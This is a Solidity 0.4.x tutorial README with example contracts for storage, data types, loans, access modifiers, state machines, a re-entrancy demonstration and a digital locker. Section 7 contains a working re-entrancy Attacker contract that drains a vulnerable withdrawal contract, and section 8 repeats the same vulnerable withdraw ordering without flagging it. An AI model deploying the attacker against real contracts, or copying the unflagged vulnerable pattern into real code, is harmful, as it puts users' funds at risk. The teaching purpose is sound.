
## [Browser solidity](#1-online-solidity-compiler)

## [Smart contract structure](#2-smart-contract)

## [Data types](#3-data-types-in-solidity)

## [Loan usecase](#4-loan)

## [Access control](#5-access-control-using-modifiers)

## [State Machine](#6-contract-as-state-machine)

## [Withdrawal pattern](#7-withdrawal-pattern-re-entrancy)

## [Prepare for failure/Rollback](#8-prepare-for-failure)

## [Digital locker](#9-digital-locker-contract)

## [Libraries](#10-solidity-libraries)
## 1. Online solidity compiler
***
Online IDE with solidity compiler
[https://remix.ethereum.org/#version=soljson-v0.4.15+commit.bbb8e64f.js](https://remix.ethereum.org/#version=soljson-v0.4.15+commit.bbb8e64f.js "Browser solidity")

 Accounts:
  
 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c 

 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C

 0x4B0897b0513fdC7C541B6d9D7E929C4e5364D2dB

 0x583031D1113aD414F02576BD6afaBfb302140225

 0xdD870fA1b7C4700F2BD7f44238821C26f7392148


### 2. Smart contract
***
```javascript
pragma solidity ^0.4.15; // Compiler version

contract SimpleStorage { // Contract declartion
    uint storedData;     // State variable

	 //Write Transaction
    function setStoredData(uint x) {    
        storedData = x;
    }

	//Read State data
    function getStoredData() constant returns (uint) {
        return storedData;
    }
}
```

### 3. Data types in solidity
***
```javascript
pragma solidity ^0.4.15;
contract Data {
    
    uint public  number=90;  
    bool public flag=true;
    address public addr=0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c;  
    bytes32 public welcomeMsg="Hi there";
    string public str="Welcome to Smart contract class";

    enum ActionChoices { GoLeft, GoRight, GoStraight }
    ActionChoices public choice;
    uint[10] public array=[1,2,3,4,5,6,7,8,9,10];
    uint[] public dynamicArray=[11,12,13];

    mapping(address=>uint) public balances; // mapping(key=>value) variableName;
    struct User {
        uint id;
        uint balance;
    }
    User public user;
    
    function Data() {  // constructor
        user=User(101,1000);
        balances[addr]=50;
        choice = ActionChoices.GoRight;
    }

}
```


### 4. Loan
***
```javascript
pragma solidity ^0.4.15;
contract  Bank {
    
        address public owner;  // owner of the contract
        
        struct Loan {  // Loan structure
           uint id;
           address borrower;
           string name;
           uint amount;
           string reason;
           string status;
       }
       
        uint totalLoan=0;  // count of total loans
        
        mapping(address => Loan) loans; // mapping address to loan
        
        // constructor executed when deploying the contract into network
        // `msg.sender` is the account creating this contract.
        function Bank() payable {
            owner = msg.sender; 
        }
        
        // transaction to request Loan
        function requestLoan(string username, uint amount, string loanReason) { 
            loans[msg.sender] = Loan(totalLoan, msg.sender, username, amount, loanReason, "Requested"); // add Loan object to mapping
            totalLoan++;
        }
        
        // get loan details
        function getLoan(address addr) constant returns(uint, string, uint, string, string) {
            Loan memory l = loans[addr];
            return (l.id, l.name, l.amount, l.reason, l.status);
        }
        
        // transaction to approve Loan based on key address 
        function approveLoan(address addr) {
            require(msg.sender == owner);
            loans[addr].status="Accepted";
            addr.transfer(loans[addr].amount);
        }
    
        // reject 
        function rejectLoan(address addr) {
            require(msg.sender == owner);
            loans[addr].status="Rejected";
        }
        
        // get Balance
        function getBalance() constant returns(uint){
            return this.balance;
        }
}
```




### 5. Access control using modifiers
***
```javascript
pragma solidity ^0.4.15;

contract AccessRestriction {
    // `msg.sender` is the account creating this contract.
    address public owner = msg.sender;
    
    modifier onlyBy() {
        require(msg.sender == owner); // Equal to if(msg.sender != account ) throw;
        _; // It returns the flow of execution
    }

    // Make `newOwner` the new owner of this contract
    function changeOwner(address newOwner) onlyBy  {
        owner = newOwner;
    }

}
```

Default access modifiers

```javascript
pragma solidity ^0.4.15;
contract c1 {
    
    uint internal a; 
    uint public b;
    uint private c;

    function setA(uint  x) private   {
        a=x;
    }
    
    function setB(uint  x) external{
        b=x;
    }
    
    function setC(uint  x)  public {
        c=x;
    }
    
     function setD(uint  x)  internal {
        c=x;
    }

}

contract c2 is c1{ // inheritance using keyword `is` 
   
    function c2() {
      setC(10);
      setD(10);
  //  setA(10);  // Error-`private` function:  cannot be called by derived contracts or external accounts
  //  setB(10);  // Error-`external` function: only by external accounts
      
       a=10; // internal variable   
       b=10; // public variable
   //  c=10; //Error-private variable 
    
    }
}


```



 

### 6. Contract as State machine 
***
```javascript
pragma solidity ^0.4.15;

contract StateMachine {
    
    enum Stages {  // State flow from applied to Finished
        Applied,
        Initiated,
        Approved,
        Received,
        Finished
        
    }

    // This is the current stage of the contract
    Stages public stage = Stages.Applied;

    modifier atStage(Stages _stage) {
        require(stage == _stage);
        _;
    }

    // Forward state of enum stage by 1
    function nextStage() internal {
        stage = Stages(uint(stage) + 1);
    }

    // This modifier goes to the next stage
    // after the function is done.
    modifier transitionNext() {
        _;
        nextStage();
    }

    function initiate()
        atStage(Stages.Applied) // initialize requires current state to be `Applied`
        transitionNext {        // Forward state

    }

    function approve()
        atStage(Stages.Initiated) // initialize requires current state to be `Initiated`
        transitionNext {          // Forward state    

    }

    function receive()
        atStage(Stages.Approved) // initialize requires current state to be `Approved`
        transitionNext {         // Forward state

    }
    
     function finish()
        atStage(Stages.Received) // initialize requires current state to be `Received`
        transitionNext {         // Forward state

    }
}
```


### 7. Withdrawal pattern re-entrancy
***
**Malicious code**
```javascript
  pragma solidity ^0.4.15;
    contract  BalanceContract {

            mapping(address=>uint) public userBalances; // mapping account=>amount

            function BalanceContract() payable {   // constructor 
                
            }

            function addToBalance() payable {   // deposit ethers to the contract and update balanne
               userBalances[msg.sender] += msg.value; // `msg.value` : Number of ethers sent in uint wei
            }
        
            function withdrawBalance() {   // withdraw total amount deposited
                uint amountToWithdraw = userBalances[msg.sender];  // read total amount deposited
                if (amountToWithdraw>0){   // check if it is greater than 0
                    msg.sender.call.value(amountToWithdraw)();  // send back ethers to the sender `msg.sender`
                }
                userBalances[msg.sender] = 0; // update map to zero
            }
            
            function getContractBalance() constant returns(uint) {
                return this.balance; // returns number of ethers contract is holding
            }

    }

        contract Attacker { 

            BalanceContract  v; //  Defining Balance contract
            
            function Attacker(address addr)  payable {
                v=BalanceContract(addr);   // Reference: BalanceContract at address `addr`
            } 
            
            function deposit()  payable {
                v.addToBalance.value(msg.value)(); // transfer the `msg.value` number of ethers to `BalanceContract`
            }
            
            function withdraw() {
                v.withdrawBalance();  // call withdrawBalance of BalanceContract to withdraw deposited ethers
            }

            // fallback function - is called when someone just sent Ether to the contract
            function() payable {  
                v.withdrawBalance();
        
            }

        }
  
```
**Solution**

   ```javascript
      pragma solidity ^0.4.15;
      contract  BalanceContract {

            mapping(address=>uint) public userBalances; // mapping account=>amount

            function BalanceContract() payable {   // constructor 
                
            }

            function addToBalance() payable {   // deposit ethers to the contract and update balanne
               userBalances[msg.sender] += msg.value; // `msg.value` : Number of ethers sent in uint wei
            }
        
            function withdrawBalance() {   // withdraw total amount deposited
                uint amountToWithdraw = userBalances[msg.sender];  // read total amount deposited
                userBalances[msg.sender] = 0; // update map to zero
                if (amountToWithdraw>0){   // check if it is greater than 0
                    msg.sender.call.value(amountToWithdraw)();  // send back ethers to the sender `msg.sender`
                }
            }
            
            function getContractBalance() constant returns(uint) {
                return this.balance; // returns number of ethers contract is holding
            }

    }

        contract Attacker { 

            BalanceContract  v; //  Defining Balance contract
            
            function Attacker(address addr)  payable {
                v=BalanceContract(addr);   // Reference: BalanceContract at address `addr`
            } 
            
            function deposit()  payable {
                v.addToBalance.value(msg.value)(); // transfer the `msg.value` number of ethers to `BalanceContract`
            }
            
            function withdraw() {
                v.withdrawBalance();  // call withdrawBalance of BalanceContract to withdraw deposited ethers
            }

            // fallback function - is called when someone just sent Ether to the contract
            function() payable {  
                v.withdrawBalance();
        
            }

        }
   ```



### 8. Prepare for failure
***
```javascript
pragma solidity ^0.4.15;
contract  BalanceContract {
    
        address owner;
    
        bool status;    // contract status-active if true 
       
        mapping(address=>uint) userBalances; // mapping address to uint balance

        modifier onlyActive {
            require(status==true); // check contract status==true
            _;
        }        
        function BalanceContract() payable  {
            owner = msg.sender;
            status = true;
        }
        
        // change status to false
        function disableContract() onlyActive {
            require(msg.sender==owner); // only owner can change
            status=false;
            owner.send(this.balance);  // send contract ethers to owner's account
        }

        function getBalance(address user) onlyActive  constant returns(uint) {  
            return userBalances[user];
        }

        function addToBalance() payable onlyActive {  
            userBalances[msg.sender] += msg.value;
        }
    
     
        function withdrawBalance() onlyActive {  
            uint amountToWithdraw = userBalances[msg.sender];
            msg.sender.call.value(amountToWithdraw)();
            userBalances[msg.sender] = 0;
        }
        
        function get()  constant returns(uint) {
            return this.balance;
        }
        
        
}
```



### 9. Digital locker contract
***
```javascript
contract DocumentContract {  
 
    //  Document structure
    struct Document {
        bytes32 name;
        bytes32 referenceURL1;
        bytes32 referenceURL2;
        uint256 date;

    }

    struct Tag {
        bytes32[] documentTags;
    }

    //map of documents
    mapping(address => mapping(bytes32 => Document)) documents;
    mapping(address => Tag) tags;

    // Events for document
    event AddDocument(address indexed from, bytes32 indexed docName);
    event UpdateDocument(address indexed from, bytes32 indexed docName);
    event DeleteDocument(address indexed from, bytes32 indexed docName);

    // add document function
    function addDocument(bytes32 name, bytes32 pReferenceURL1, bytes32 pReferenceURL2) {
        documents[msg.sender][name] = Document({
            name: name,
            date: now,
            referenceURL1: pReferenceURL1,
            referenceURL2: pReferenceURL2
        });
        tags[msg.sender].documentTags.push(name);
        AddDocument(msg.sender, name); //Log event
    }

    // update document function
    function updateDocument(bytes32 name, bytes32 pReferenceURL1, bytes32 pReferenceURL2) {
        documents[msg.sender][name] = Document({
            name: name,
            date: now,
            referenceURL1: pReferenceURL1,
            referenceURL2: pReferenceURL2
        });
        UpdateDocument(msg.sender, name); // Log event
    }

    // delete document function
    function deleteDocument(bytes32 name) {
        for (uint i = 0; i < tags[msg.sender].documentTags.length; i++) {
            if (tags[msg.sender].documentTags[i] == name) {
                delete tags[msg.sender].documentTags[i];
            }
        }
        delete documents[msg.sender][name];
        DeleteDocument(msg.sender, name); // Log event
    }

    // get document data
    function getDocument(bytes32 pName) constant returns(bytes32[4]) {
        bytes32[4] memory temp;
        temp[0] = documents[msg.sender][pName].name;
        temp[1] = documents[msg.sender][pName].referenceURL1;
        temp[2] = documents[msg.sender][pName].referenceURL2;
        temp[3] = bytes32(documents[msg.sender][pName].date);
        return temp;
    }

    // get document list
    function getDocumentTags() constant returns(bytes32[]) {
        return tags[msg.sender].documentTags;
    }

}

contract RequestContract { 
    
    struct Request { // Request structure
        uint reqId;
        address requester;
        address user;
        bytes32 status;
        bytes32 documentName;
        uint256 date;
        bytes32 selectedDocument;
        string key;
        string pubKey;
        bytes32 referenceURL1;
        bytes32 referenceURL2;
    }
   
    uint totalReq = 0;
   
    // map of Requests
    mapping(uint => Request) request;
    mapping(address => uint[]) incomingRequest;
    mapping(address => uint[]) outgoingRequest;

    //Events for requests
    event RequestDocument(address indexed to, address indexed from, bytes32 indexed docName);
    event AcceptRequest(uint indexed reqId, address indexed  from, address indexed to);
    event RejectRequest(uint indexed reqid, address indexed from, address indexed to);
    event Shared(address indexed from, address indexed to, bytes32 indexed docName);

    // get incoming request function
    function getIncomingRequests() constant returns(uint[]) {
        return incomingRequest[msg.sender];
    }
    // get Outgoing request function
    function getOutgoingRequests() constant returns(uint[]) {
        return outgoingRequest[msg.sender];
    }

    // share Document function
    function shareDocument(address userId, bytes32 selectedDoc, string key, string pubKey, bytes32 pReferenceURL1, bytes32 pReferenceURL2) {
        totalReq++;
        request[totalReq] = Request({
            reqId: totalReq,
            requester: userId,
            user: msg.sender,
            status: "shared",
            documentName: selectedDoc,
            date: now,
            selectedDocument: selectedDoc,
            key: key,
            pubKey: pubKey,
            referenceURL1: pReferenceURL1,
            referenceURL2: pReferenceURL2
        });
        outgoingRequest[msg.sender].push(totalReq);
        incomingRequest[userId].push(totalReq);
        Shared(msg.sender,userId, selectedDoc); // Log event
    }

    // get all requests
    function getAllRequestDetails(uint reqid) external constant returns(bytes32[8]) {
        bytes32[8] memory temp;
        if (request[reqid].requester == msg.sender || request[reqid].user == msg.sender) {
            temp[0] = bytes32(request[reqid].requester);
            temp[1] = request[reqid].status;
            temp[2] = request[reqid].documentName;
            temp[3] = bytes32(request[reqid].date);
            temp[4] = bytes32(request[reqid].user);
            temp[5] = request[reqid].selectedDocument;
            temp[6] = request[reqid].referenceURL1;
            temp[7] = request[reqid].referenceURL2;
        }
        return temp;
    }

    // get session key
    function getSessionKey(address userId, uint reqId) external constant returns(string) {
        if (request[reqId].requester == msg.sender && (request[reqId].status == "accepted" || request[reqId].status == "shared")) {
            return request[reqId].key;
        }
    }

    // get public key
    function getPublicKey(uint reqId) external constant returns(string) {
        return request[reqId].pubKey;
    }

    // get document data
    function getDocument(address userId, uint reqId) constant returns(bytes32[2]) {
        if (request[reqId].requester == msg.sender && (request[reqId].status == "accepted" || request[reqId].status == "shared")) {
            bytes32[2] memory link;
            link[0] = request[reqId].referenceURL1;
            link[1] = request[reqId].referenceURL2;
            return link;
        }
    }
}

contract AccountContract { 

     // Account structure
    struct Account {
        bytes32 name;
        uint256 totalreq;
        string publicKey;
        string documentKey;
        bytes32[] documentTags;

    }

    // map of accounts
    mapping(address => Account) accounts;

    function checkAccountExists() constant returns(bool) {
        if (accounts[msg.sender].name == "") {
            return false;
        } else {
            return true;
        }
    }

    // new account function
    function newAccount(bytes32 name, string publicKey, string documentKey) {
        if (accounts[msg.sender].name == "") {
            accounts[msg.sender].name = name;
            accounts[msg.sender].totalreq = 0;
            accounts[msg.sender].publicKey = publicKey;
            accounts[msg.sender].documentKey = documentKey;
        } else {
            throw;
        }
    }

    // get key function
    function getKeyHash() constant returns(string) {
         return accounts[msg.sender].publicKey;
    }

    //get specific key function
    function getSpecificKey(address addr) constant returns(string) {
        return accounts[addr].publicKey;
    }

    // get Document key
    function getDocumentKey() constant returns(string) {
        return accounts[msg.sender].documentKey;
    }

    // get name function
    function getName() constant returns(bytes32) {
        return accounts[msg.sender].name;
    }
    
    function getUserName(address id) constant returns(bytes32) {
        return accounts[id].name;
    }
    
    // test function
    function getSender() constant returns(address) {
        return msg.sender;
    }

}

// Digital locker contract
contract DigitalLocker is DocumentContract, AccountContract, RequestContract {
    
        address owner = msg.sender;

        function kill() {
            require(msg.sender == owner);
            selfdestruct(owner);
        }
}
```



### 10. Solidity libraries
***
[String Util](https://github.com/Arachnid/solidity-stringutils ) 

[Ethereum stackoverflow solidity](https://ethereum.stackexchange.com/questions/tagged/solidity )

[Solidity repo](https://github.com/OpenZeppelin/zeppelin-solidity )
